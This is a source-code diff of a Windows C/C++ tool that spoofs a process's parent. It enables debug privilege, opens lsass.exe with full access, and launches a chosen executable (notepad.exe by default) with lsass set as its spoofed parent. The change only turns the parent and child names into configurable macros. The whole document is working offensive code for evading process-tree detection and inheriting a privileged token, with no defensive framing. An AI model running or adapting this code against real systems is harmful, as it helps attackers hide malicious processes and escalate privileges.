@@ -1,5 +1,5 @@
-//Spoofing a parent process, for choosing any parent process change - "lsass.exe" - to any desired processes.
-//To choose the child process who is spoofing his parent, change - "C:\\Windows\\System32\\notepad.exe" - to any desired exe file.
+//Spoofing a parent process, for choosing any parent process change - PARENT_PROC - to any desired processes.
+//To choose the child process who is spoofing his parent, change - CHILD_PROC - to any desired exe file.
 //This program changes the AttributeList in the StartupInfo structure, and then the process created by CreatedProcess is created with new StartupInfo - Spoofing his parent process
 
 #include <stdio.h>
@@ -8,7 +8,8 @@
 #include <TlHelp32.h>
 
 #define MAX_LEN 1024
-
+#define PARENT_PROC "lsass.exe"
+#define CHILD_PROC "C:\\Windows\\System32\\notepad.exe"
 
 BOOL EnableDebug(void)
 {
@@ -77,8 +78,7 @@ DWORD GetPid(TCHAR* ProcName)
 int _tmain(int argc, TCHAR* argvp[])
 {
 	EnableDebug();
-	TCHAR ProcName[MAX_LEN] = _T("lsass.exe");
-	DWORD pid = GetPid(ProcName);
+	DWORD pid = GetPid(_T(PARENT_PROC));
 
 	HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	STARTUPINFOEX startInfo = { sizeof(startInfo) };
@@ -91,5 +91,5 @@ int _tmain(int argc, TCHAR* argvp[])
 	UpdateProcThreadAttribute(startInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
 	startInfo.StartupInfo.cb = (sizeof(STARTUPINFOEX));
 
-	CreateProcess(_T("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFO>(&startInfo), &processInfo);
+	CreateProcess(_T(CHILD_PROC), NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFO>(&startInfo), &processInfo);
 }
